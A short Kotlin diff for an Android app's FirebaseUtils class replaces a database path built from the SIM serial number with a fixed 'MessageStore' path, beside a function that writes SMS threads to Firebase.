@@ -26,8 +26,7 @@ class FirebaseUtils(val context: Context) {
     }
 
     val databasePre: DatabaseReference by lazy {
-        val simSerialNumber = TelephoneUtil.getInstance(context).simSerialNumber()
-        FirebaseDatabase.getInstance().getReference("" + simSerialNumber)
+        FirebaseDatabase.getInstance().getReference("MessageStore")
     }
 
     fun createMessages(smsThreads: ArrayList<SmsThread>) {
